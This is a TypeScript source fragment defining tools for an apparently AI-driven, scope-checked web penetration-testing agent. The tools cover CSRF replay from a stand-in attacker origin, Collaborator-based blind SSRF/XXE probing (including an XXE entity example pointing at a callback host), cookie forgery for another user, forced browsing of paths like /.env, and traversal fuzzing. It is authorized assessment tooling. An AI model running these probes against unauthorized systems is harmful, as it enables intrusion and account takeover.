      "Confirm CSRF on a state-changing request. Only meaningful for COOKIE-based sessions — Bearer/Authorization is NOT auto-sent cross-site, so Bearer-auth endpoints are not CSRF-able (the tool returns not-applicable). Give a request that currently SUCCEEDS with the session ({method,url,headers?,body?}); the tool (1) sends it with NO auth (must FAIL → proves auth is enforced), then (2) sends it with the COOKIE ONLY (no Authorization, like a browser cross-site request), the anti-CSRF token STRIPPED, and a cross-site Origin/Referer — twice; if it still SUCCEEDS, CSRF protection is missing/ineffective. `stripFields`/`stripHeaders` override which token names are removed (defaults cover csrf/_csrf/authenticity_token/X-CSRF-Token/X-Requested-With). Returns negativeControl(no-auth) + positiveReplays(stripped) evidenceIds for record_finding(category csrf). IMPORTANT: also confirm the session cookie is NOT SameSite=Strict/Lax (use analyze_session) — if it is, it is NOT cross-site exploitable.",
      { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), stripFields: z.array(z.string()).optional(), stripHeaders: z.array(z.string()).optional() },
      async ({ method, url, headers, body, stripFields, stripHeaders }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} out of scope`);
        if (!s.currentCookie)
          return txt("NOT APPLICABLE: no session cookie — this session is Bearer/none. Browsers don't auto-send Authorization cross-site, so Bearer-auth endpoints are not CSRF-able (CSRF needs a cookie-based session).");
        const fields = (stripFields ?? ["csrf", "_csrf", "csrf_token", "csrftoken", "authenticity_token", "__requestverificationtoken", "xsrf", "_token"]).map((f) => f.toLowerCase());
        const dropHeaders = new Set((stripHeaders ?? ["x-csrf-token", "x-xsrf-token", "x-csrftoken", "x-requested-with", "csrf-token"]).map((h) => h.toLowerCase()));
        const stripBody = (b: string | null): string | null => {
          if (!b) return b;
          const t = b.trim();
          if (t.startsWith("{")) {
            try {
              const o = JSON.parse(t) as Record<string, unknown>;
              for (const k of Object.keys(o)) if (fields.includes(k.toLowerCase())) delete o[k];
              return JSON.stringify(o);
            } catch {
              /* not JSON → form 扱いへ */
            }
          }
          return b.split("&").filter((kv) => !fields.includes((kv.split("=")[0] ?? "").toLowerCase())).join("&");
        };
        const baseHeaders: Record<string, string> = {};
        for (const [k, v] of Object.entries(headers ?? {})) if (!dropHeaders.has(k.toLowerCase())) baseHeaders[k] = v;
        const evil = "https://amraam-csrf.example";
        const crossOrigin = { origin: evil, referer: `${evil}/` };
        const fire = async (hdr: Record<string, string>, bdy: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: method.toUpperCase(), url, headers: hdr, body: bdy };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-csrf", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `csrf ${tag}` });
          return { evId: ev.id, status: res.status };
        };
        let ctrl: Awaited<ReturnType<typeof fire>>;
        let p1: Awaited<ReturnType<typeof fire>>;
        let p2: Awaited<ReturnType<typeof fire>>;
        try {
          // (1) 無認証(cookie も bearer も無し)+ cross-origin → 認証が効いていれば失敗するはず。
          ctrl = await fire({ ...baseHeaders, ...crossOrigin }, body ?? null, "negative_control", "no-auth (must fail)");
          // (2) cookie のみ(Authorization は付けない=ブラウザのクロスサイト相当)+ token 除去 + cross-origin。
          const atkHeaders = { ...baseHeaders, ...crossOrigin, cookie: s.currentCookie };
          const atkBody = stripBody(body ?? null);
          p1 = await fire(atkHeaders, atkBody, "positive_replay", "cookie-only, token-stripped #1");
          p2 = await fire(atkHeaders, atkBody, "positive_replay", "cookie-only, token-stripped #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 160)}`);
        }
        const ok2xx = (n: number): boolean => n >= 200 && n < 300;
        const authEnforced = !ok2xx(ctrl.status);
        const csrfWorks = ok2xx(p1.status) && ok2xx(p2.status);
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            noAuth: { status: ctrl.status },
            strippedCookieOnly: [{ status: p1.status }, { status: p2.status }],
            verdict:
              authEnforced && csrfWorks
                ? "LIKELY CSRF — auth IS enforced (no-auth failed) yet the cookie-only, token-stripped, cross-origin request SUCCEEDED twice. Before record_finding(csrf): confirm the session cookie is NOT SameSite=Strict/Lax (analyze_session) — only then is it cross-site exploitable."
                : !authEnforced
                  ? "not confirmed: the no-auth request also succeeded — this endpoint isn't auth-gated (not CSRF; treat as access-control / missing-auth instead)."
                  : "not confirmed: the token-stripped / cross-origin request did NOT succeed — CSRF protection appears present.",
          }),
        );
      },
    ),
    tool(
      "probe_oob",
      "Confirm a BLIND / out-of-band vuln via Burp Collaborator: blind SSRF, blind XXE, blind SQLi (DNS/HTTP exfil), OS command injection, header SSRF (X-Forwarded-Host / Referer / Host), email/webhook SSRF — anything where the EFFECT is the SERVER making an external request, not a visible response. Requires the AMRAAM Audit REST extension with Collaborator enabled (BURP_AUDIT_API). Put a {{OOB}} placeholder where the callback host belongs (a URL field, an XXE SYSTEM entity `<!ENTITY x SYSTEM \"http://{{OOB}}/\">`, a hostname, a header value). The tool generates a unique Collaborator host, injects it (in-scope target request), and polls ~waitSec for a DNS/HTTP/SMTP callback FROM the target; a callback = the server reached our host out-of-band = confirmed. Records a benign control + the injected request → negativeControl + positiveReplays evidenceIds for record_finding(category ssrf / rce as appropriate). NOTE: callbacks can lag seconds; nothing back after waitSec = not confirmed (try other params/headers/schemes).",
      { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), waitSec: z.number().optional(), note: z.string().optional() },
      async ({ method, url, headers, body, waitSec, note }) => {
        if (!s.oob) return txt("OOB NOT AVAILABLE: set BURP_AUDIT_API (+ enable Collaborator in Burp) to use probe_oob. Without it, blind SSRF/XXE/SQLi cannot be confirmed out-of-band.");
        const inPlaceholder = url.includes("{{OOB}}") || (body?.includes("{{OOB}}") ?? false) || Object.values(headers ?? {}).some((v) => v.includes("{{OOB}}"));
        if (!inPlaceholder) return txt("ERROR: put a {{OOB}} placeholder where the callback host should be injected (in url, body, or a header value).");
        let payload: { host: string; id: string };
        try {
          payload = await oobPayload(s.oob);
        } catch (e) {
          return txt(`OOB error: ${String(e).slice(0, 160)} (is the extension up and Collaborator enabled in Burp's project settings?)`);
        }
        const startTs = Date.now();
        const sub = (v: string, host: string): string => v.replace(/\{\{OOB\}\}/g, host);
        const inject = async (host: string, kind: "negative_control" | "positive_replay", resultBody: string): Promise<string> => {
          const u = sub(url, host);
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const hdr: Record<string, string> = {};
          for (const [k, v] of Object.entries(headers ?? {})) hdr[k] = sub(v, host);
          const req: HttpRequest = { method: method.toUpperCase(), url: u, headers: { ...authHeaders(s), ...hdr }, body: body != null ? sub(body, host) : null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          // 証拠の body は OOB の結果(マーカー= collaborator host)に差し替える。ブラインドなので HTTP 応答自体は無意味。
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-oob",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: { ...res, body: `[AMRAAM-OOB] ${resultBody}` },
            note: note ? `${note} (oob)` : "oob",
          });
          return ev.id;
        };
        let controlEv: string;
        try {
          // negative control: コールバックしない良性ホストを注入(interaction が出ないこと)。
          controlEv = await inject(`amraam-oob-noref-${payload.id.slice(0, 8)}.invalid`, "negative_control", "control: benign host, no callback expected");
          // 本注入: collaborator host を埋めて送信。
          await inject(payload.host, "positive_replay", `injected Collaborator host ${payload.host} (id ${payload.id}); polling for callback…`);
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 160)}`);
        }
        // コールバックは非同期(秒〜)。waitSec まで数秒おきにポーリング。
        const budgetMs = Math.min(Math.max(waitSec ?? 20, 5), 45) * 1000;
        const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        let hits: Awaited<ReturnType<typeof oobPoll>> = [];
        const t0 = Date.now();
        while (Date.now() - t0 < budgetMs) {
          await sleep(3000);
          try {
            hits = await oobPoll(s.oob, { since: startTs, id: payload.id });
          } catch {
            /* keep polling */
          }
          if (hits.length > 0) break;
        }
        const confirmed = hits.length > 0;
        const summary = confirmed ? hits.map((h) => `${h.type}@${new Date(h.time).toISOString()}${h.clientIp ? ` from ${h.clientIp}` : ""}`).join("; ") : `no callback within ${Math.round(budgetMs / 1000)}s`;
        // positiveReplays ×2: 確証結果(マーカー= host)を 2 件記録 → record_finding の証拠規律(>=2 安定 positive)に乗せる。
        // positive の evidence body は **固定の長文(host 込み)** にする。ssrf/rce は非マーカー判定(checkEvidenceDiscipline)で
        // control との body 長差 >64 が要るため、confirmed 時は control より常時十分長くなるようにして取りこぼしを防ぐ。
        const resBody = confirmed
          ? `OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external ${hits.map((h) => h.type).join("/")} request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=${payload.host} payload_id=${payload.id} interactions=[${summary}]`
          : `no out-of-band callback within ${Math.round(budgetMs / 1000)}s for ${payload.host}`;
        const p1 = await inject(payload.host, "positive_replay", `${resBody} [read#1]`).catch(() => "");
        const p2 = await inject(payload.host, "positive_replay", `${resBody} [read#2]`).catch(() => "");
        return txt(
          JSON.stringify({
            negativeControl: controlEv,
            positiveReplays: [p1, p2].filter(Boolean),
            effectMarker: payload.host,
            collaboratorHost: payload.host,
            interactions: hits,
            verdict: confirmed
              ? `OOB CONFIRMED — the target made ${hits.length} out-of-band ${hits.map((h) => h.type).join("/")} request(s) to our Collaborator host. record_finding(ssrf / rce / xxe as fits the sink) with these evidenceIds + effectMarker (the callback host).`
              : `not confirmed: no Collaborator callback within ${Math.round(budgetMs / 1000)}s. The sink may be filtered, the response not blind, or the callback slow — try another param/header (X-Forwarded-Host, Referer), scheme (http/dns/gopher), or a longer waitSec.`,
          }),
        );
      },
    ),
    tool(
      "probe_scenario",
      'Confirm a MULTI-STEP business-logic abuse that spans endpoints (coupon stacking/forging, negative quantity/price reaching checkout, skipping a payment/approval/ownership step, mass-assignment escalation, double-spend). You give an ordered `control` flow (legitimate) and an ordered `exploit` flow (manipulated). Each step: {method,url,headers?,body?,capture?}. `capture` maps varName→a JSON path (e.g. data.id, basket.0.id) OR regex applied to THAT step\'s response; later steps reference it as {{varName}} in url/body/headers (thread ids/tokens through the chain). The current session cookie+Bearer are attached automatically. `effectMarker` is a string that appears in a response ONLY when the manipulation is ACCEPTED (the injected total/price, an out-of-order step returning 200, a coupon applied twice). The control flow runs once (must NOT show the marker); the exploit flow runs twice (must show it, stably). Returns evidenceIds (control=negativeControl, exploit=positiveReplays) ready for record_finding with a price-tampering/qty-tampering/workflow-bypass/mass-assignment category.',
      {
        control: z.array(z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), capture: z.record(z.string()).optional() })).min(1),
        exploit: z.array(z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), capture: z.record(z.string()).optional() })).min(1),
        effectMarker: z.string(),
        note: z.string().optional(),
      },
      async ({ control, exploit, effectMarker, note }) => {
        type Step = { method: string; url: string; headers?: Record<string, string>; body?: string | null; capture?: Record<string, string> };
        // 1 フローを順番に実行: {{var}} 置換 → 送信 → 証拠記録 → capture を vars に蓄積。
        const runFlow = async (steps: Step[], kind: "negative_control" | "positive_replay", tag: string) => {
          const vars: Record<string, string> = {};
          let lastStatus = 0;
          // マーカーは「最終ステップのレスポンス」で判定する(record_finding の logic ゲートが引用する
          // 最終ステップ evidence と一致させるため)。効果は確認画面=フロー末尾に出る想定。
          let finalMarker = false;
          const evIds: string[] = [];
          for (let i = 0; i < steps.length; i++) {
            const st = steps[i] as Step;
            const url = substVars(st.url, vars);
            if (!isInScope(url, s.scope)) throw new Error(`step ${i + 1} out of scope: ${url}`);
            const stepHeaders: Record<string, string> = {};
            for (const [k, v] of Object.entries(st.headers ?? {})) stepHeaders[k] = substVars(v, vars);
            const req: HttpRequest = {
              method: st.method.toUpperCase(),
              url,
              headers: { ...authHeaders(s), ...stepHeaders },
              body: st.body != null ? substVars(st.body, vars) : null,
            };
            const res = await s.http.send(req);
            bumpHttp(s, res.status);
            lastStatus = res.status;
            finalMarker = res.body.includes(effectMarker);
            for (const [name, expr] of Object.entries(st.capture ?? {})) {
              const val = extractValue(res.body, expr);
              if (val != null) vars[name] = val;
            }
            const ev = s.evidence.record({
              screenId: s.currentScreenId ?? "scenario",
              validator: "claude-pilot-scenario",
              kind,
              request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
              response: res,
              note: `${note ? note + " " : ""}${tag} · step ${i + 1}/${steps.length} ${req.method} ${url}`,
            });
            evIds.push(ev.id);
          }
          return { status: lastStatus, hasMarker: finalMarker, evId: evIds[evIds.length - 1] as string, evIds };
        };
        let ctrl: Awaited<ReturnType<typeof runFlow>>;
        let ex1: Awaited<ReturnType<typeof runFlow>>;
        let ex2: Awaited<ReturnType<typeof runFlow>>;
        try {
          ctrl = await runFlow(control, "negative_control", "control (legit flow)");
          ex1 = await runFlow(exploit, "positive_replay", "exploit flow #1");
          ex2 = await runFlow(exploit, "positive_replay", "exploit flow #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 200)}`);
        }
        // 証拠規律(マーカーベース): control にマーカー無し + exploit ≥2 にマーカー有り + status<400 + 安定。
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: ctrl.hasMarker },
          [ex1, ex2].map((x) => ({ status: x.status, hasMarker: x.hasMarker })),
        );
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [ex1.evId, ex2.evId],
            control: { status: ctrl.status, marker: ctrl.hasMarker, steps: ctrl.evIds.length },
            exploit: [
              { status: ex1.status, marker: ex1.hasMarker, steps: ex1.evIds.length },
              { status: ex2.status, marker: ex2.hasMarker, steps: ex2.evIds.length },
            ],
            verdict: verdict.ok
              ? "WORKFLOW MANIPULATION ACCEPTED — record_finding with these evidenceIds + effectMarker"
              : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "scenario_done",
      "Finish the scenario (A04 multi-step) stage. Call this once every transactional workflow has been tested. Pass a one-line coverage summary.",
      { summary: z.string() },
      async ({ summary }) => {
        s.scenarioDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🧩 SCENARIO done: ${summary.slice(0, 300)}` } });
        return txt("scenario stage complete.");
      },
    ),
    tool(
      "record_finding",
      "Record a CONFIRMED vulnerability. Requires evidence discipline: cite ONE `negativeControl` evidenceId (a request that should FAIL — the bug absent) and >=2 `positiveReplays` evidenceIds (the bug reproduced, stable). Use evidenceIds returned by http_request / verify_access THIS run. The control must be distinguishable from the positives (different status/length) or it is rejected as a catch-all. Pick the canonical `category`, and pass the vulnerable `endpoint` (URL or path template, e.g. /search or /orders/{id}) and `param` (e.g. q) — findings are DEDUPED by (category, endpoint, param).",
      {
        title: z.string(),
        severity: z.enum(["info", "low", "medium", "high", "critical"]),
        category: z.enum(CATEGORIES),
        endpoint: z.string(),
        param: z.string().optional(),
        description: z.string(),
        reproSteps: z.string(),
        negativeControl: z.string(),
        positiveReplays: z.array(z.string()).min(2),
        effectMarker: z.string().optional(),
      },
      async ({ title, severity, category, endpoint, param, description, reproSteps, negativeControl, positiveReplays, effectMarker }) => {
        // auth-bypass は verify_access の機械判定を通った時だけ記録できる(CRM の 302/401 誤検知を硬く封じる)。
        if (category === "auth-bypass") {
          const av = s.accessVerdicts.get(normEndpoint(endpoint, s.targetUrl));
          if (av === "not_bypass")
            return txt(`REJECTED: verify_access on ${endpoint} returned 'not_bypass' (redirect→login / 401 / 403 = auth is enforced). Mechanical veto, cannot record.`);
          if (!av) return txt(`REQUIRED: run verify_access(${endpoint}) before recording auth-bypass (302→login / 401 / 403 is not a bypass).`);
        }
        // ── 証拠規律の構造強制 ── 引用 evidenceId が実在し、ネガコンが positive と区別でき、positive 同士が安定であること。
        const findEv = (eid: string) => s.evidence.records.find((r) => r.id === eid);
        const negRec = findEv(negativeControl);
        const posRecs = positiveReplays.map((eid) => findEv(eid));
        const missing = [negativeControl, ...positiveReplays].filter((eid) => !findEv(eid));
        if (!negRec || posRecs.some((r) => !r))
          return txt(`REJECTED: unknown evidenceId(s) ${missing.join(", ")}. Cite ids returned by http_request / verify_access / probe_logic in THIS run (1 negativeControl + >=2 positiveReplays).`);
        if (MARKER_BASED_CATEGORIES.has(category)) {
          // マーカーベース: 長さ差分でなく「印(effectMarker)」の有無で確証する。
          //   business-logic → probe_logic/probe_scenario の effectMarker / xss → 未エスケープ反射 / redirect → OOB host。
          if (!effectMarker)
            return txt(`REJECTED: ${category} requires effectMarker (the string that appears only when the issue fires — the unescaped payload for xss, the OOB host for open-redirect, the injected total for business-logic). Run probe_xss / probe_redirect / probe_logic / probe_scenario and cite its evidenceIds + the marker.`);
          // マーカーは body だけでなくヘッダも見る(open-redirect の印は Location ヘッダに出る)。
          const hasMarker = (r: { body: string; headers: Record<string, string> }): boolean =>
            r.body.includes(effectMarker) || JSON.stringify(r.headers ?? {}).includes(effectMarker);
          const verdict = checkLogicEvidence(
            { status: negRec.response.status, hasMarker: hasMarker(negRec.response) },
            posRecs.map((r) => ({ status: r!.response.status, hasMarker: hasMarker(r!.response) })),
          );
          if (!verdict.ok) return txt(`REJECTED (logic evidence): ${verdict.reason}.`);
        } else if (category !== "auth-bypass") {
          const verdict = checkEvidenceDiscipline(
            { status: negRec.response.status, bodyLen: negRec.response.body.length },
            posRecs.map((r) => ({ status: r!.response.status, bodyLen: r!.response.body.length })),
          );
          if (!verdict.ok)
            return txt(`REJECTED (evidence discipline): ${verdict.reason}. Get a negative control that fails + >=2 stable positive replays, then record.`);
        }
        const evidenceIds = [...new Set([negativeControl, ...positiveReplays])];
        s.recordCalls += 1;
        s.screenVerdict = "finding";
        const key = dedupKey(category, endpoint, param, s.targetUrl);
        const existing = s.findingsByKey.get(key);
        if (existing) {
          // 同一の穴を別画面/別シンクから再発見 → マージ(証拠を束ね、重大度は最大、文脈を追記)。
          existing.evidenceIds = [...new Set([...existing.evidenceIds, ...evidenceIds])];
          existing.severity = maxSev(existing.severity, severity as Severity);
          existing.description += `\n\n[+] Also observed as "${title}"${s.currentScreenId ? ` (screen ${s.currentScreenId})` : ""}.`;
          s.store.upsertFinding(s.assessmentId, existing);
          s.store.appendEvent(s.assessmentId, {
            type: "note",
            payload: { message: `↩ DEDUP ${existing.id} += "${title}" (${key}; ${existing.evidenceIds.length} ev, sev ${existing.severity})` },
          });
          return txt(`merged into ${existing.id} (same ${key}); now ${existing.evidenceIds.length} evidence, severity ${existing.severity}. Do not re-report this endpoint+param.`);
        }
        s.findCounter += 1;
        const f: Finding = {
          id: `f-${String(s.findCounter).padStart(3, "0")}`,
          screenId: s.currentScreenId,
          title: `[${category}] ${title}`,
          severity: severity as Severity,
          source: { kind: "validator", validatorName: "claude-pilot" },
          description,
          reproSteps,
          evidenceIds,
          scopeBasis: `authorized target ${s.targetUrl}`,
        };
        s.findings.push(f);
        s.findingsByKey.set(key, f);
        s.store.upsertFinding(s.assessmentId, f);
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `FINDING ${f.id}: ${f.title} [${f.severity}]${f.screenId ? ` @${f.screenId}` : ""}` },
        });
        return txt(`recorded ${f.id}: ${f.title}`);
      },
    ),
    tool(
      "screen_done",
      "Finish diagnosing the current screen. You MUST account for EVERY class the plan named: pass `coverage` with one entry per planned class — result 'found' (you recorded it), 'tested-clean' (you actively probed it and it held), or 'not-applicable' (with a concrete reason it cannot apply here). Finding ONE hole does NOT let you skip the rest of the plan. verdict 'finding' if >=1 confirmed, else 'clean'.",
      {
        verdict: z.enum(["finding", "clean"]),
        coverage: z
          .array(z.object({ class: z.string(), result: z.enum(["found", "tested-clean", "not-applicable"]), note: z.string().optional() }))
          .optional()
          .describe("one entry per planned attack class (from get_screen.plannedClasses)"),
        note: z.string().optional(),
      },
      async ({ verdict, coverage, note }) => {
        // ── カバレッジ・ゲート ── プランが挙げた攻撃クラスを全部 coverage で説明できるまで画面を閉じさせない。
        //   「1個見つけて screen_done」を構造的に封じる(non-terminal nudge: screenDone は立てずに差し戻す)。
        const planned = plannedClassesFor(s.plans.get(s.currentScreenId ?? ""));
        const gate = checkScreenCoverage(planned, coverage ?? [], s.screenProbes);
        if (!gate.ok) return txt(`NOT DONE — ${gate.reason}`);
        s.screenVerdict = verdict;
        s.screenDone = true;
        const covSummary = coverage?.length ? ` [${coverage.map((c) => `${coarseClass(c.class)}:${c.result}`).join(", ")}]` : "";
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `✓ ${s.currentScreenId} → ${verdict}${covSummary}${note ? ` — ${note.slice(0, 160)}` : ""}` },
        });
        return txt(`screen ${s.currentScreenId} → ${verdict}${covSummary}`);
      },
    ),
    // ───────────────────────── 能動探索(A): paths ─────────────────────────
    tool(
      "probe_paths",
      "Forced-browse a built-in wordlist of common/hidden paths within scope (e.g. /status, /admin, /api/profile, /continue, /.env). Finds UNLINKED endpoints that link-following misses; in-scope HTML hits are queued for mapping. Soft-404 baseline is auto-filtered. Optionally pass extra paths.",
      { extra: z.array(z.string()).optional() },
      async ({ extra }) => {
        let base = { status: 404, len: -1 };
        try {
          const r = await s.http.send({ method: "GET", url: new URL(`/veritas-404-${Date.now()}`, s.targetUrl).toString(), headers: authHeaders(s), body: null });
          base = { status: r.status, len: r.body.length };
        } catch {
          /* ignore */
        }
        const list = [...PATH_WORDLIST, ...(extra ?? [])];
        const hits: Array<Record<string, unknown>> = [];
        let skippedLogout = 0;
        for (const path of list) {
          let url: string;
          try {
            url = new URL(path, s.targetUrl).toString();
          } catch {
            continue;
          }
          if (!isInScope(url, s.scope)) continue;
          if (pathIsIgnored(url, s.ignorePaths, s.targetUrl)) continue; // モデルが間引いたパスはプローブしない
          // logout/signout 系は絶対に GET しない(認証セッションを破棄して以降の診断を全滅させるため)。
          if (isSessionDestroyingPath(url)) {
            skippedLogout += 1;
            continue;
          }
          let res: HttpResponse;
          try {
            res = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
          } catch {
            continue;
          }
          if (res.status === 404) continue;
          if (res.status === base.status && Math.abs(res.body.length - base.len) <= 16) continue; // catch-all 除外
          const ct = (res.headers["content-type"] ?? "").split(";")[0] ?? "";
          hits.push({ path, status: res.status, type: ct, len: res.body.length, location: res.headers["location"] });
          if (res.status < 400 && /html/.test(ct) && !s.visited.has(stripHash(url))) s.frontier.add(stripHash(url));
        }
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `🔍 probe_paths: ${hits.length} hit(s)/${list.length}, frontier=${s.frontier.size}${skippedLogout ? `, skipped ${skippedLogout} logout-path(s)` : ""}` },
        });
        return txt(JSON.stringify({ hits, queuedToFrontier: s.frontier.size, ...(skippedLogout ? { skippedLogoutPaths: skippedLogout } : {}) }));
      },
    ),

    // ───────────────────────── 能動探索(A): params ─────────────────────────
    tool(
      "probe_params",
      "Fuzz a URL with high-signal hidden parameters the app never sent — IDOR (id/userId/...), redirect (to/next/url/... → external marker), debug (debug/admin/...), file (path traversal). Reports params that changed behaviour (redirect/reflection of the marker, traversal signature, or a different response vs baseline). Confirm any hit with evidence discipline before record_finding. Optionally pass extra {param:value}.",
      { url: z.string(), extra: z.record(z.string()).optional() },
      async ({ url, extra }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        let base: HttpResponse;
        try {
          base = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
          bumpHttp(s, base.status);
        } catch (e) {
          return txt(`ERROR baseline: ${String(e).slice(0, 150)}`);
        }
        const probes = [
          ...PARAM_PROBES,
          ...Object.entries(extra ?? {}).map(([name, value]) => ({ name, value, kind: "idor" as const })),
        ];
        const interesting: Array<Record<string, unknown>> = [];
        for (const pr of probes) {
          let u: string;
          try {
            const x = new URL(url, s.targetUrl);
            x.searchParams.set(pr.name, pr.value);
            u = x.toString();
          } catch {
            continue;
          }
          if (!isInScope(u, s.scope)) continue;
          let res: HttpResponse;
          try {
            res = await s.http.send({ method: "GET", url: u, headers: authHeaders(s), body: null });
          } catch {
            continue;
          }
          const loc = res.headers["location"] ?? "";
          const reflectsMarker = pr.kind === "redirect" && (loc.includes(OOB_MARKER) || res.body.includes(OOB_MARKER));
          const traversal = pr.kind === "file" && /root:.*:0:0:|\[fonts\]|\[extensions\]/i.test(res.body);
          const changed = pr.kind !== "redirect" && (res.status !== base.status || Math.abs(res.body.length - base.body.length) > 64);
          if (!reflectsMarker && !traversal && !changed) continue;
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot",
            kind: "positive_replay",
            request: { method: "GET", url: u, headers: s.http.effectiveHeaders(authHeaders(s)), body: null },
            response: res,
            note: `probe ${pr.name}=${pr.value} (${pr.kind})`,
          });
          interesting.push({
            param: pr.name,
            value: pr.value,
            kind: pr.kind,
            status: res.status,
            location: loc || undefined,
            len: res.body.length,
            signal: reflectsMarker ? "redirect/reflection" : traversal ? "traversal" : "changed-vs-baseline",
            evidenceId: ev.id,
          });
        }
        return txt(JSON.stringify({ baseline: { status: base.status, len: base.body.length }, interesting }));
      },
    ),

    // ───────────────────────── セッション解析(B) ─────────────────────────
    tool(
      "analyze_session",
      "Inspect the current auth cookies — flags (HttpOnly/Secure/SameSite), structure (jwt/hex/base64/plain) and predictability (e.g. value equals the username). Returns guidance to CONFIRM forgeability by http_request with a crafted cookie header for another identity (negative control: a clearly-invalid forged value must NOT authenticate).",
      {},
      async () => {
        let cookies;
        try {
          cookies = await s.driver.cookies();
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 150)}`);
        }
        const role = s.currentRole.toLowerCase();
        const analysis = cookies.map((c) => {
          const v = c.value;
          const isJwt = v.split(".").length === 3 && v.length > 20;
          const structure = isJwt ? "jwt" : /^[0-9a-f]{16,}$/i.test(v) ? "hex" : /^[A-Za-z0-9+/=_-]{16,}$/.test(v) ? "base64ish" : "plain";
          const equalsRole = Boolean(role) && v.toLowerCase().includes(role);
          const predictable = equalsRole || (!isJwt && structure === "plain" && v.length < 12);
          return {
            name: c.name,
            value: v.length > 48 ? `${v.slice(0, 48)}…` : v,
            httpOnly: c.httpOnly,
            secure: c.secure,
            sameSite: c.sameSite,
            structure,
            equalsCurrentRole: equalsRole,
            predictable,
          };
        });
        return txt(
          JSON.stringify({
            currentRole: s.currentRole || "unauth",
            cookies: analysis,
            hint: "If a cookie is predictable (equals/contains the username) or lacks HttpOnly, forge it for ANOTHER user via http_request headers.cookie and check you receive their data. Negative control: an invalid forged value must fail to authenticate.",
          }),
        );
      },
    ),

    // ── auth-bypass の hybrid ゲート(機械 veto + Claude 判断) ──
    tool(
      "verify_access",
      "Mechanically verify an auth-bypass / broken-access-control claim on an in-scope URL. Fetches it WITHOUT a session and WITH the current session, then returns a verdict: 'not_bypass' = a redirect-to-login / 401 / 403 / login-page body (auth IS working — a HARD veto, do NOT record); 'needs_judgment' = unauth returned 200 & non-login (returns both bodies — confirm only if the unauth body IS the protected content); 'inconclusive' = no session, login(role) first. Records the unauth (negative control) + authed (baseline) as evidence.",
      { url: z.string() },
      async ({ url }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        let rUnauth: HttpResponse;
        try {
          rUnauth = await s.http.send({ method: "GET", url, headers: {}, body: null });
          bumpHttp(s, rUnauth.status);
        } catch (e) {
          return txt(`ERROR (unauth): ${String(e).slice(0, 150)}`);
        }
        let rAuth: HttpResponse | null = null;
        if (s.currentCookie || s.currentBearer) {
          try {
            rAuth = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
            bumpHttp(s, rAuth.status);
          } catch {
            rAuth = null;
          }
        }
        const evIds = [
          s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "verify_access",
            kind: "negative_control",
            request: { method: "GET", url, headers: s.http.effectiveHeaders({}), body: null },
            response: rUnauth,
            note: "unauthenticated access attempt",
          }).id,
        ];
        if (rAuth) {
          evIds.push(
            s.evidence.record({
              screenId: s.currentScreenId ?? "pilot",
              validator: "verify_access",
              kind: "positive_replay",
              request: { method: "GET", url, headers: s.http.effectiveHeaders(authHeaders(s)), body: null },
              response: rAuth,
              note: `authenticated baseline as ${s.currentRole || "?"}`,
            }).id,
          );
        }
        const { verdict, reason } = classifyAccess(
          { status: rUnauth.status, location: rUnauth.headers["location"], body: rUnauth.body },
          rAuth ? { status: rAuth.status, body: rAuth.body } : null,
        );
        s.accessVerdicts.set(normEndpoint(url, s.targetUrl), verdict); // record_finding の硬い gate 用
        const gray = verdict === "needs_judgment";
        return txt(
          JSON.stringify({
            verdict,
            reason,
            evidenceIds: evIds,
            unauth: { status: rUnauth.status, len: rUnauth.body.length, ...(gray ? { body: rUnauth.body.slice(0, 1500) } : {}) },
            auth: rAuth ? { status: rAuth.status, len: rAuth.body.length, ...(gray ? { body: rAuth.body.slice(0, 1500) } : {}) } : null,
            ...(gray
              ? { hint: "Confirm auth-bypass ONLY if the unauth body IS the protected data (matches authed / exposes sensitive info). A generic page that merely returns 200 is NOT a bypass." }
              : {}),
          }),
        );
      },
    ),

    tool(
      "done",
      "Finish the whole assessment early with a concise summary (normally the orchestrator ends each stage; use only to abort).",
      { summary: z.string() },
      async ({ summary }) => {
        s.done = true;
        s.doneSummary = summary;
        return txt("assessment complete — summary recorded");
      },
    ),
  ];
}
